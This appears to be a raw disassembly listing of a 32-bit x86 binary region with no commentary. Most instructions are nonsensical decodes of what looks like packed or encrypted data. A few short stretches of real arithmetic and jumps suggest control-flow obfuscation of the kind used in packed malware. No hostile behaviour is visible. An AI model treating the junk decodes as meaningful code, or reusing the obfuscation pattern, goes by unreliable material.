  40c835:	mov    dh,0xef
  40c837:	fs inc ecx
  40c839:	ret    0xa284
  40c83c:	es stos DWORD PTR es:[edi],eax
  40c83e:	add    cl,BYTE PTR [ebp+0x6e]
  40c841:	imul   ebx,edi,0x2d
  40c844:	test   dl,ah
  40c846:	add    ch,BYTE PTR [ecx]
  40c848:	retw   0x2b6
  40c84c:	cmp    BYTE PTR [eax+0x242abc04],0xc2
  40c853:	mov    ebp,DWORD PTR [ebx]
  40c855:	mov    ah,0x4c
  40c857:	in     eax,dx
  40c858:	lods   eax,DWORD PTR ds:[esi]
  40c859:	cmp    dl,bl
  40c85b:	ret    0x2bad
  40c85e:	clc    
  40c85f:	in     al,dx
  40c860:	arpl   WORD PTR [ebx+0x78],dx
  40c863:	test   al,0x67
  40c865:	lock inc BYTE PTR [ecx+0x3d87940d]
  40c86c:	or     eax,0x3e6a586
  40c871:	and    al,0xcd
  40c873:	inc    edi
  40c874:	xlat   BYTE PTR ds:[ebx]
  40c875:	mov    ah,0xb2
  40c877:	test   al,0x30
  40c879:	xchg   ebx,eax
  40c87a:	daa    
  40c87b:	push   0x15524342
  40c880:	ins    DWORD PTR es:[edi],dx
  40c881:	adc    eax,0x3119afc9
  40c886:	(bad)  
  40c887:	hlt    
  40c888:	sar    DWORD PTR [edi+0x18],cl
  40c88b:	or     edx,ecx
  40c88d:	lock xor eax,0x59ce9ed6
  40c893:	sub    al,0x15
  40c895:	mov    al,ds:0x9ae69e5a
  40c89a:	xor    BYTE PTR [edx],0x5c
  40c89d:	pop    ds
  40c89e:	jp     0x40c820
  40c8a0:	es mov dl,0xb0
  40c8a3:	xchg   BYTE PTR [ebx],bh
  40c8a5:	jns    0x40c922
  40c8a7:	fild   WORD PTR [edx-0x62322774]
  40c8ad:	jp     0x40c8c3
  40c8af:	rcl    BYTE PTR [ecx],1
  40c8b1:	xor    BYTE PTR ds:0x438fc42b,cl
  40c8b7:	pop    ebx
  40c8b8:	les    esi,FWORD PTR [ebx-0x22f8fa9d]
  40c8be:	jmp    ebx
  40c8c0:	fs xchg esi,eax
  40c8c2:	mov    edi,ss
  40c8c4:	icebp  
  40c8c5:	cmp    ebx,DWORD PTR [ebx+0x77]
  40c8c8:	mov    ds:0x575eabeb,al
  40c8cd:	mov    cl,0x5f
  40c8cf:	rcr    ch,cl
  40c8d1:	push   ds
  40c8d2:	push   ecx
  40c8d3:	fs mov dl,0x9d
  40c8d6:	adc    DWORD PTR [eax+0x61554a19],edx
  40c8dc:	pop    esp
  40c8dd:	(bad)
  40c8e0:	push   cs
  40c8e1:	mov    ds:0xb26d405f,al
  40c8e6:	icebp  
  40c8e7:	out    0x5c,eax
  40c8e9:	mov    bh,0xb2
  40c8eb:	jl     0x40c87f
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	sub    al,0x27
  40c91a:	fwait
  40c91b:	inc    ecx
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c906
  40c925:	sub    eax,DWORD PTR [ecx-0x3dfe1a4f]
  40c92b:	jle    0x40c958
  40c92d:	repnz jmp 0x2fad:0xc774546c
  40c935:	cs jmp 0x40c994
  40c938:	add    ebx,DWORD PTR [ebx+0x7999ba74]
  40c93e:	and    BYTE PTR [ecx-0x2181a9af],cl
  40c944:	and    BYTE PTR [eax-0x597a661d],cl
  40c94a:	dec    esp
  40c94b:	pop    eax
  40c94c:	loopne 0x40c9a2
  40c94e:	repz mov al,ds:0xc0506c07
  40c954:	jl     0x40c912
  40c956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c957:	mov    al,ds:0xe650eac8
  40c95c:	aaa    
  40c95d:	jnp    0x40c97c
  40c95f:	adc    DWORD PTR [ecx],edx
  40c961:	jnp    0x40c90d
  40c963:	call   0x33731091
  40c968:	fidiv  DWORD PTR [ecx]
  40c96a:	cmp    al,0x3e
  40c96c:	mov    ah,0xa8
  40c96e:	(bad)  
  40c96f:	fst    DWORD PTR [eax+ecx*4-0x7dbf7d91]
  40c976:	add    dl,BYTE PTR [eax-0x1fc98e39]
  40c97c:	inc    edi
  40c97d:	xor    al,0xe2
  40c97f:	hlt    
  40c980:	inc    eax
  40c981:	jbe    0x40c98d
  40c983:	outs   dx,BYTE PTR ds:[esi]
  40c984:	pop    edx
  40c985:	inc    edi
  40c986:	loope  0x40c958
  40c988:	pop    esi
  40c989:	ss push edx
  40c98b:	call   0x4f1f:0x1bed8760
  40c992:	rcr    DWORD PTR [eax],0x52
  40c995:	in     eax,dx
  40c996:	mov    ebp,DWORD PTR [edx+0x5c]
  40c999:	mov    dl,0xff
  40c99b:	adc    BYTE PTR [ebp+0xc],bl
  40c99e:	add    al,0x26
  40c9a0:	inc    esp
  40c9a1:	ret    
  40c9a2:	sbb    BYTE PTR [eax-0x5c9fb30d],bh
  40c9a8:	pop    eax
  40c9a9:	mov    ds:0xd46713a5,al
  40c9ae:	idiv   BYTE PTR [ebx]
  40c9b0:	cmp    al,0x24
  40c9b2:	test   BYTE PTR [edi+0x35d597cc],dh
  40c9b8:	jne    0x40c98b
  40c9ba:	repnz lods eax,DWORD PTR ds:[esi]
  40c9bc:	push   edx
  40c9bd:	mov    cl,0xf5
  40c9bf:	push   ss
  40c9c0:	test   eax,0xc8ad1596
  40c9c5:	rol    DWORD PTR [edx],cl
  40c9c7:	lds    ecx,FWORD PTR [ebx]
  40c9c9:	popf   
  40c9ca:	xor    BYTE PTR [ebx-0x46],dh
  40c9cd:	jae    0x40c9da
  40c9cf:	jae    0x40ca21
  40c9d1:	pop    ebp
  40c9d2:	jmp    0x155c:0xfa016c70
  40c9d9:	jle    0x40c99c
  40c9db:	shl    BYTE PTR ds:0xcc2cf7b4,0x2a
  40c9e2:	xchg   ebx,eax
  40c9e3:	dec    ecx
  40c9e4:	(bad)  
  40c9e5:	(bad)  
  40c9e6:	sbb    eax,0x499b8f78
  40c9eb:	rcr    DWORD PTR [si-0x4],cl
  40c9ef:	adc    esi,ebx
  40c9f1:	mov    cl,0x2f
  40c9f3:	pop    ss
  40c9f4:	(bad)  
  40c9f5:	aas    
  40c9f6:	adc    esi,DWORD PTR [ecx-0x46be43be]
  40c9fc:	aas    
  40c9fd:	(bad)  
  40c9fe:	jecxz  0x40c9c6
  40ca00:	push   cs
  40ca01:	pusha  
  40ca02:	outs   dx,DWORD PTR ds:[esi]
  40ca03:	js     0x40ca48
  40ca05:	dec    ecx
  40ca06:	sbb    DWORD PTR [edx],ecx
  40ca08:	pop    eax
  40ca09:	and    eax,0x7354f9d7
  40ca0e:	stos   DWORD PTR es:[edi],eax
  40ca0f:	fcompp 
  40ca11:	outs   dx,BYTE PTR ds:[esi]
  40ca12:	mov    ebp,0x38353d83
  40ca17:	mov    dh,0x23
  40ca19:	fimul  WORD PTR [esi+0x78497e6f]
  40ca1f:	lods   eax,DWORD PTR ds:[esi]
  40ca20:	sub    al,0xda
  40ca22:	fistp  DWORD PTR gs:[ebx]
  40ca25:	cdq    
  40ca26:	mov    ah,0xe9
  40ca28:	cmp    BYTE PTR [ebx+0x577cf5a7],ah
  40ca2e:	jmp    0x92c6fcde
  40ca33:	jb     0x40ca1a
  40ca35:	fdivp  st(2),st
  40ca37:	mov    esi,0x7e069eba
  40ca3c:	int    0xdd
  40ca3e:	xchg   ecx,edx
  40ca40:	or     eax,0x3f490b95
  40ca45:	adc    bl,BYTE PTR [eax-0x3ca96576]
  40ca4b:	data16 or ch,BYTE PTR [eax]
  40ca4e:	push   esi
  40ca4f:	neg    bh
  40ca51:	mov    ds:0xc064f8c,eax
  40ca56:	cmp    ebp,DWORD PTR [eax+0x796c055e]
  40ca5c:	jge    0x40caaa
  40ca5e:	cmp    BYTE PTR [ecx+0x7b7727f0],al
  40ca64:	std    
  40ca65:	jle    0x40ca7e
  40ca67:	hlt    
  40ca68:	loop   0x40cac3
  40ca6a:	stos   DWORD PTR es:[edi],eax
  40ca6b:	or     DWORD PTR [edi-0x426e63ca],0xdfdb4fb1
  40ca75:	push   esp
  40ca76:	or     BYTE PTR [eax-0x1f66d515],dh
  40ca7c:	or     eax,0x93a11697
  40ca81:	mov    eax,ds:0x60fbafd9
  40ca86:	mov    dl,0xaf
  40ca88:	inc    ebp
  40ca89:	inc    esi
  40ca8a:	test   al,0x90
  40ca8c:	dec    bp
  40ca8e:	mov    eax,0x6dc6c41
  40ca93:	cdq    
  40ca94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca95:	pop    ebp
  40ca96:	or     edx,DWORD PTR [esi]
  40ca98:	jle    0x40ca1c
  40ca9a:	xor    esi,DWORD PTR [esi+0x29]
  40ca9d:	mov    ah,0x80
  40ca9f:	xchg   ebp,eax
  40caa0:	adc    ah,al
  40caa2:	jle    0x40ca58
  40caa4:	pop    esp
  40caa5:	mov    dl,0x2
  40caa7:	sbb    eax,0x558ec76e
  40caac:	dec    esp
  40caad:	xchg   BYTE PTR [ebx+0x61],ch
  40cab0:	add    eax,0x21ae6ddf
  40cab5:	call   0xd693:0x14fd2346
  40cabc:	fstp   DWORD PTR [esi+eax*8]
  40cabf:	lds    ebx,FWORD PTR [eax-0x4d3a8d45]
  40cac5:	mov    ds:0x35e7a3a,al
  40caca:	fucomi st,st(2)
  40cacc:	inc    eax
  40cacd:	mov    dh,0x19
  40cacf:	lods   eax,DWORD PTR ds:[esi]
  40cad0:	adc    DWORD PTR [eax-0x77],esp
  40cad3:	pop    ebp
  40cad4:	shr    DWORD PTR [esi-0x53],1
  40cad7:	(bad)
  40cada:	push   esi
  40cadb:	dec    ecx
  40cadc:	ja     0x40cae2
  40cade:	stos   DWORD PTR es:[edi],eax
  40cadf:	or     bh,dh
  40cae1:	pop    edx
  40cae2:	lods   eax,DWORD PTR ds:[esi]
  40cae3:	mov    edi,0x7c6b6bcf
  40cae8:	in     al,dx
  40cae9:	xlat   BYTE PTR ds:[ebx]
  40caea:	sub    DWORD PTR [esi+edx*8],ecx
  40caed:	xchg   ebp,eax
  40caee:	mov    bh,0xc9
  40caf0:	retf   0x5f1c
  40caf3:	fwait
  40caf4:	or     BYTE PTR [ebx+ebx*4+0x39],dl
  40caf8:	mov    ecx,0x7e3648b7
  40cafd:	loope  0x40cb23
  40caff:	sti    
  40cb00:	sbb    esi,DWORD PTR [edi]
  40cb02:	and    ch,ah
  40cb04:	sbb    BYTE PTR [edx-0x7a],al
  40cb07:	(bad)  
  40cb09:	jno    0x40cb59
  40cb0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb0c:	push   esp
  40cb0d:	outs   dx,BYTE PTR ds:[esi]
  40cb0e:	inc    esi
  40cb0f:	fild   QWORD PTR [edi]
  40cb11:	bound  edi,QWORD PTR ds:0x27ea3cfb
  40cb17:	pop    ebx
  40cb18:	out    0x7d,al
  40cb1a:	mov    esp,0x6e0700bb
  40cb1f:	lahf   
  40cb20:	xor    al,0xa6
  40cb22:	xchg   ebx,eax
  40cb23:	jnp    0x40cb0d
  40cb25:	ds hlt 
  40cb27:	test   eax,edx
  40cb29:	ins    DWORD PTR es:[edi],dx
  40cb2a:	je     0x40cb56
  40cb2c:	fnstenv [edx+0x3c08f17f]
  40cb32:	imul   ebp,DWORD PTR [eax-0x38b797e6],0x670c7ee7
  40cb3c:	mov    ?,ebx
  40cb3e:	leave  
  40cb3f:	fcomp  DWORD PTR [ecx]
  40cb41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb42:	jmp    0xdd6d:0xa490843a
  40cb49:	add    ebx,ebp
  40cb4b:	les    eax,FWORD PTR ds:0x8768c92e
  40cb51:	imul   ebp,DWORD PTR [esi],0x2c514aa3
  40cb57:	adc    eax,0xe0e300d1
  40cb5c:	mov    bl,0xeb
  40cb5e:	inc    ebp
  40cb5f:	and    ch,ch
  40cb61:	sub    eax,0x82a3b0eb
  40cb66:	add    edx,DWORD PTR [edx-0x52]
  40cb69:	(bad)  
  40cb6a:	push   esp
  40cb6b:	inc    ebp
  40cb6c:	pusha  
  40cb6d:	xchg   BYTE PTR [edx+eiz*1+0x33fee706],bh
  40cb74:	(bad)  
  40cb75:	jb     0x40cbe9
  40cb77:	push   ebx
  40cb78:	xor    eax,0x12019e3a
  40cb7d:	js     0x40cb4b
  40cb7f:	pop    eax
  40cb80:	xchg   edi,eax
  40cb81:	dec    eax
  40cb82:	retf   0x51cd
  40cb85:	in     al,0x44
  40cb87:	adc    bl,al
  40cb89:	scas   al,BYTE PTR es:[edi]
  40cb8a:	mov    edi,0x4d441960
  40cb8f:	jae    0x40cbad
  40cb91:	imul   edi,DWORD PTR [ebp-0x544b80fb],0x39
  40cb98:	jp     0x40cb2c
  40cb9a:	mov    dh,0x23
  40cb9c:	push   0xe5038f0b
  40cba1:	jp     0x40cb5c
  40cba3:	mov    edx,0x36f50812
  40cba8:	sub    DWORD PTR [esi],edi
  40cbaa:	repz dec ebp
  40cbac:	(bad)
  40cbaf:	mov    ebx,0xa6f9dfe9
  40cbb4:	stc    
  40cbb5:	lods   al,BYTE PTR ds:[esi]
  40cbb6:	push   ebx
  40cbb7:	xchg   edx,eax
  40cbb8:	sub    al,0x1f
  40cbba:	jecxz  0x40cb6f
  40cbbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbbd:	adc    BYTE PTR [eax],0x43
  40cbc0:	sbb    DWORD PTR [ebx-0x3cd74f15],esp
  40cbc6:	and    bl,0xa8
  40cbc9:	jne    0x40cb9a
  40cbcb:	and    ebp,ebx
  40cbcd:	pop    ecx
  40cbce:	sub    eax,0x27c9c1ce
  40cbd3:	sub    al,0x6c
  40cbd5:	jge    0x40cc00
  40cbd7:	mov    ?,WORD PTR [edi-0x26]
  40cbda:	dec    edi
  40cbdb:	mov    eax,0x953400da
  40cbe0:	cmp    ch,BYTE PTR [eax+esi*2]
  40cbe3:	and    al,0xb9
  40cbe5:	or     al,0xa9
  40cbe7:	pop    ss
  40cbe8:	mov    ebp,DWORD PTR [ebx+0x6a]
  40cbeb:	stos   DWORD PTR es:[edi],eax
  40cbec:	mul    BYTE PTR [edx-0x181d72ab]
  40cbf2:	daa    
  40cbf3:	std    
  40cbf4:	jmp    0xbf4b:0xf1a99a1b
  40cbfb:	pop    eax
  40cbfc:	call   0x895cce01
  40cc01:	xor    BYTE PTR [eax],0x72
  40cc04:	mov    al,ds:0x43a88b87
  40cc09:	in     al,dx
  40cc0a:	test   eax,0x1b8ecc18
  40cc0f:	or     bl,BYTE PTR [edi]
  40cc11:	nop
  40cc12:	jge    0x40cbec
  40cc14:	push   esp
  40cc15:	das    
  40cc16:	fimul  WORD PTR [ebp-0x203e0eb]
  40cc1c:	leave  
  40cc1d:	push   esp
  40cc1e:	pop    ss
  40cc1f:	fs nop
  40cc21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc22:	ficom  WORD PTR [ebx]
  40cc24:	sub    cl,BYTE PTR ds:0xa748cbf9
  40cc2a:	push   ds
  40cc2b:	push   esi
  40cc2c:	out    0x33,al
  40cc2e:	mov    edx,ebp
  40cc30:	iret   
  40cc31:	inc    BYTE PTR [esi-0x4b371c9f]
  40cc37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc38:	inc    ebp
  40cc39:	outs   dx,BYTE PTR ds:[esi]
  40cc3a:	xchg   esi,eax
  40cc3b:	pop    esi
  40cc3c:	and    BYTE PTR [esi+esi*4+0xa],ch
  40cc40:	mov    bl,0x35
  40cc42:	jle    0x40cbe9
  40cc44:	out    0x3f,al
  40cc46:	int3   
  40cc47:	xlat   BYTE PTR ds:[ebx]
  40cc48:	mov    edx,0x695d28bf
  40cc4d:	inc    ecx
  40cc4e:	jne    0x40ccbc
  40cc50:	lea    ebp,[edx]
  40cc52:	jae    0x40cbd8
  40cc54:	imul   ebx,DWORD PTR [eax-0x15],0xffffff83
  40cc58:	and    bh,0x3
  40cc5b:	mov    ds:0x339ceb1,al
  40cc60:	sbb    al,0xfa
  40cc62:	retf   
  40cc63:	inc    edi
  40cc64:	nop
  40cc65:	or     eax,0xd7023d28
  40cc6a:	mov    dh,0xaf
  40cc6c:	dec    ebp
  40cc6d:	dec    edi
  40cc6e:	ss aad 0x67
  40cc71:	lods   al,BYTE PTR ds:[esi]
  40cc72:	jl     0x40cc9b
  40cc74:	sub    edx,ebp
  40cc76:	fld    TBYTE PTR [edx+edi*8+0x2a]
  40cc7a:	xor    edi,DWORD PTR [ebx-0x38]
  40cc7d:	fs mov al,0x6e
  40cc80:	mov    DWORD PTR [ebx],edi
  40cc82:	lods   eax,DWORD PTR ds:[esi]
  40cc83:	out    0x69,al
  40cc85:	mov    ebp,0x4b51aae3
  40cc8a:	addr16 inc ecx
  40cc8c:	add    BYTE PTR [esi],0x4b
  40cc8f:	loopne 0x40cc47
  40cc91:	inc    eax
  40cc92:	add    al,0xae
  40cc94:	sub    edi,esi
  40cc96:	stc    
  40cc97:	cli    
  40cc98:	inc    ecx
  40cc99:	rcr    BYTE PTR [eax+ebx*8+0x58478d56],1
  40cca0:	mov    eax,0x7c11301e
  40cca5:	popf   
  40cca6:	jne    0x40cc52
  40cca8:	push   es
  40cca9:	pop    eax
  40ccaa:	mov    ebx,0xc3aa27c0
  40ccaf:	push   ecx
  40ccb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccb1:	(bad)  
  40ccb2:	arpl   WORD PTR [ebp+0x12583a05],ax
  40ccb8:	add    edi,DWORD PTR [edx]
  40ccba:	xor    eax,0x647189dd
  40ccbf:	sub    BYTE PTR [esi+0x48],bh
  40ccc2:	xor    DWORD PTR [eax+0x30],0x33
  40ccc6:	clc    
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	cmp    DWORD PTR [edx],0x1b
  40cd18:	and    esp,DWORD PTR [edi+0xb]
  40cd1b:	nop
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40ccc3
  40cd23:	js     0x40cd33
  40cd25:	lea    edx,ds:0x228d4d54
  40cd2b:	fsubr  DWORD PTR [ecx]
  40cd2d:	fadd   DWORD PTR [ebx+0x2b650abc]
  40cd33:	call   0x1462a8d7
  40cd38:	jb     0x40cd4a
  40cd3a:	jo     0x40cd48
  40cd3c:	and    BYTE PTR [ebp-0x587df269],ah
  40cd42:	imul   ebp,DWORD PTR [ebx-0x2b],0x33
  40cd46:	ins    DWORD PTR es:[edi],dx
  40cd47:	mov    eax,0x69beace2
  40cd4c:	mov    al,0x6
  40cd4e:	and    al,BYTE PTR [esi]
  40cd50:	aad    0x7c
  40cd52:	ds (bad) 
  40cd55:	pop    ds
  40cd56:	mov    ebp,0x2db465c0
  40cd5b:	xchg   edx,eax
  40cd5c:	add    BYTE PTR [ecx],ch
  40cd5e:	pop    edx
  40cd5f:	sbb    al,0xda
  40cd61:	inc    ebx
  40cd62:	and    DWORD PTR [ebx-0x1],0x79d1dbe3
  40cd69:	(bad)  
  40cd6a:	sub    ebp,DWORD PTR [edx-0x2e]
  40cd6d:	in     al,0xae
  40cd6f:	iret   
  40cd70:	mov    bl,0x2d
  40cd72:	out    0xc3,ax
  40cd75:	xor    esi,DWORD PTR [ebx-0x53]
  40cd78:	jmp    0x40cd31
  40cd7a:	jns    0x40cd7f
  40cd7c:	or     ebx,edi
  40cd7e:	imul   esi,DWORD PTR [eax-0x6047a5da],0x408db7f7
  40cd88:	(bad)  
  40cd89:	dec    ebx
  40cd8a:	pop    edi
  40cd8b:	pop    esi
  40cd8c:	mov    al,ds:0x1bc81194
  40cd91:	push   0xffffffc7
  40cd93:	jl     0x40cd8f
  40cd95:	xchg   ebx,eax
  40cd96:	xor    cl,ah
  40cd98:	fdiv   DWORD PTR [edi]
  40cd9a:	pop    ecx
  40cd9b:	cmp    DWORD PTR [edx],esi
  40cd9d:	jp     0x40cd86
  40cd9f:	out    dx,al
  40cda0:	sub    al,0x3b
  40cda2:	mov    edi,0xd469a19d
  40cda7:	pusha  
  40cda8:	stos   DWORD PTR es:[edi],eax
  40cda9:	mov    al,0xd8
  40cdab:	pop    ecx
  40cdac:	ror    DWORD PTR [esi+0x6364e1b3],0xc8
  40cdb3:	pop    esp
  40cdb4:	sahf   
  40cdb5:	fsubp  st(1),st
  40cdb7:	loop   0x40ce38
  40cdb9:	int3   
  40cdba:	jo     0x40cdc2
  40cdbc:	push   esi
  40cdbd:	adc    BYTE PTR [esi-0x6d5774b2],dl
  40cdc3:	inc    edi
  40cdc4:	xchg   edi,eax
  40cdc5:	or     ah,BYTE PTR [eax]
  40cdc7:	popf   
  40cdc8:	repz fmul QWORD PTR [edi-0x2c30ccbc]
  40cdcf:	mov    dl,0xe9
  40cdd1:	rol    BYTE PTR [edi],cl
  40cdd3:	xchg   esp,eax
  40cdd4:	adc    al,0xbf
  40cdd6:	dec    ecx
  40cdd7:	dec    edx
  40cdd8:	ret    
  40cdd9:	ins    DWORD PTR es:[edi],dx
  40cdda:	push   ecx
  40cddb:	call   0xad17c98
  40cde0:	sub    ah,BYTE PTR [eax-0x5c1a84c7]
  40cde6:	pop    edi
  40cde7:	xchg   ecx,eax
  40cde8:	daa    
  40cde9:	and    al,0xf8
  40cdeb:	dec    esp
  40cdec:	cmp    ch,BYTE PTR [ebp-0x44]
  40cdef:	outs   dx,BYTE PTR ds:[esi]
  40cdf0:	mov    ah,0xad
  40cdf2:	dec    ecx
  40cdf3:	inc    edi
  40cdf4:	imul   ebx,DWORD PTR [edi+0x3342ab52],0x7a12a12c
  40cdfe:	daa    
  40cdff:	std    
  40ce00:	mov    WORD PTR [eax+esi*2],cs
  40ce03:	pop    esi
  40ce04:	adc    bl,BYTE PTR [eax+ebp*4]
  40ce07:	or     ebp,DWORD PTR [ebp-0x7df24de5]
  40ce0d:	ss repz cli 
  40ce10:	dec    ebx
  40ce11:	call   0x9fb3:0x808d896
  40ce18:	fmul   QWORD PTR [edi+0x113df5aa]
  40ce1e:	mov    cl,BYTE PTR [edi-0x1b3baf9]
  40ce24:	push   0x55ea4af1
  40ce29:	or     eax,0x84e6fa92
  40ce2e:	stc    
  40ce2f:	in     al,dx
  40ce30:	or     eax,0xd93a92
  40ce35:	dec    esi
  40ce36:	(bad)  
  40ce37:	sahf   
  40ce38:	iret   
  40ce39:	mov    eax,ds:0x8c733685
  40ce3e:	lods   al,BYTE PTR ds:[esi]
  40ce3f:	mov    ecx,?
  40ce41:	jae    0x40ce28
  40ce43:	imul   ecx,DWORD PTR [ebp+0x11],0x267e856c
  40ce4a:	ret    
  40ce4b:	jg     0x40ce1e
  40ce4d:	fdivr  st(6),st
  40ce4f:	ins    BYTE PTR es:[edi],dx
  40ce50:	mov    edx,0xee301cd2
  40ce55:	retf   0xd40d
  40ce58:	inc    eax
  40ce59:	jmp    0x6ec83418
  40ce5e:	mov    ecx,0x156efddb
  40ce63:	jne    0x40ce4c
  40ce65:	jmp    0xade0:0x3c3575e7
  40ce6c:	and    BYTE PTR [edi+0x425e6967],0x70
  40ce73:	repz adc ah,ch
  40ce76:	jb     0x40ce74
  40ce78:	adc    eax,0x5df224
  40ce7d:	push   esp
  40ce7e:	out    dx,al
  40ce7f:	imul   DWORD PTR [edi-0x5de9e142]
  40ce85:	out    0x2b,eax
  40ce87:	iret   
  40ce88:	pop    ss
  40ce89:	fcomp  QWORD PTR [eax+edi*2]
  40ce8c:	ret    0xe7dc
  40ce8f:	xor    BYTE PTR [eax+edi*4-0x392d0a2b],0x98
  40ce97:	xor    eax,0x642d3e61
  40ce9c:	jg     0x40ceea
  40ce9e:	shl    DWORD PTR [esi-0x22c27c7d],1
  40cea4:	mov    cl,0x6a
  40cea6:	sub    al,0x60
  40cea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea9:	jne    0x40cf16
  40ceab:	jnp    0x40cf19
  40cead:	mov    esi,DWORD PTR [ebx+0x33]
  40ceb0:	(bad)  
  40ceb1:	jle    0x40cf09
  40ceb3:	mov    ch,0x55
  40ceb5:	sub    edx,esp
  40ceb7:	icebp  
  40ceb8:	lea    edi,[ecx+ebx*4+0x27]
  40cebc:	aaa    
  40cebd:	test   eax,0x861fb59c
  40cec2:	loop   0x40cf05
  40cec4:	aas    
  40cec5:	in     al,0x94
  40cec7:	sahf   
  40cec8:	xchg   DWORD PTR [ebx+eiz*2],edx
  40cecb:	or     al,0xb5
  40cecd:	int    0xd5
  40cecf:	in     al,0x7c
  40ced1:	(bad)  [ecx+esi*4]
  40ced4:	stc    
  40ced5:	sub    al,0x1
  40ced7:	sub    DWORD PTR [ebx+0x5],esp
  40ceda:	in     eax,0x99
  40cedc:	dec    esp
  40cedd:	nop
  40cede:	(bad)  
  40cedf:	ret    
  40cee0:	imul   esi,ebx,0xffffffa0
  40cee3:	add    eax,0x105cf1ef
  40cee8:	in     eax,0xe7
  40ceea:	stos   DWORD PTR es:[edi],eax
  40ceeb:	into   
  40ceec:	xchg   ebx,eax
  40ceed:	(bad)  
  40ceee:	mov    ch,0x62
  40cef0:	cs clc 
  40cef2:	ror    DWORD PTR [esi+0x2c98d875],1
  40cef8:	adc    BYTE PTR [edx-0x54],bh
  40cefb:	shl    DWORD PTR [ecx+0x4eef4d5a],cl
  40cf01:	test   BYTE PTR [ebp+0x631233e],dh
  40cf07:	xchg   esi,eax
  40cf08:	mov    ebx,0xf84b6b39
  40cf0d:	enter  0xb0b9,0x3d
  40cf11:	mov    dl,0xb1
  40cf13:	and    ah,BYTE PTR [ebp+0x2acf4ba]
  40cf19:	test   DWORD PTR [ebp+0x479b24d2],ecx
  40cf1f:	stos   BYTE PTR es:[edi],al
  40cf20:	lahf   
  40cf21:	mov    ds:0x3e99f6dd,al
  40cf26:	loope  0x40cf8d
  40cf28:	loope  0x40cee8
  40cf2a:	mov    ?,ebp
  40cf2c:	bound  ebp,QWORD PTR [eax-0x547fcf67]
  40cf32:	scas   al,BYTE PTR es:[edi]
  40cf33:	scas   al,BYTE PTR es:[edi]
  40cf34:	add    ebx,DWORD PTR [ecx-0x27]
  40cf37:	in     eax,dx
  40cf38:	sub    ah,al
  40cf3a:	outs   dx,DWORD PTR ds:[esi]
  40cf3b:	pop    ebx
  40cf3c:	adc    DWORD PTR [edi],0xffffff87
  40cf3f:	pop    esp
  40cf40:	lock xor DWORD PTR [esi+0x71f4fe38],ecx
  40cf47:	adc    esp,DWORD PTR [eax-0x36]
  40cf4a:	mov    eax,ds:0x7f513768
  40cf4f:	sbb    bl,bh
  40cf51:	push   cs
  40cf52:	cmp    al,0x78
  40cf54:	call   0x5663:0x521d45e0
  40cf5b:	pushf  
  40cf5c:	adc    eax,0x1e5b2242
  40cf61:	mov    ebx,0x4c25105e
  40cf66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf67:	jp     0x40cf07
  40cf69:	jbe    0x40cfc0
  40cf6b:	xchg   esi,eax
  40cf6c:	imul   edx,DWORD PTR [esi-0x1ec5912],0xcf8714c5
  40cf76:	mov    ds,edx
  40cf78:	jae    0x40cfb2
  40cf7a:	aad    0xcd
  40cf7c:	(bad)  
  40cf7d:	cwde   
  40cf7e:	adc    edi,esi
  40cf80:	pop    edi
  40cf81:	mov    al,ds:0x86bfd215
  40cf86:	cs push cs
  40cf88:	ficom  WORD PTR [ebx+eax*8+0x2f6da824]
  40cf8f:	cs mov esi,0xbe0a67f7
  40cf95:	mov    ah,0xb9
  40cf97:	pop    ds
  40cf98:	cmp    al,0xee
  40cf9a:	stos   BYTE PTR es:[edi],al
  40cf9b:	dec    edi
  40cf9c:	inc    esi
  40cf9d:	scas   al,BYTE PTR es:[edi]
  40cf9e:	push   0xffffffde
  40cfa0:	in     eax,0xc0
  40cfa2:	lods   al,BYTE PTR ds:[esi]
  40cfa3:	sar    BYTE PTR ds:0xe13b57f3,cl
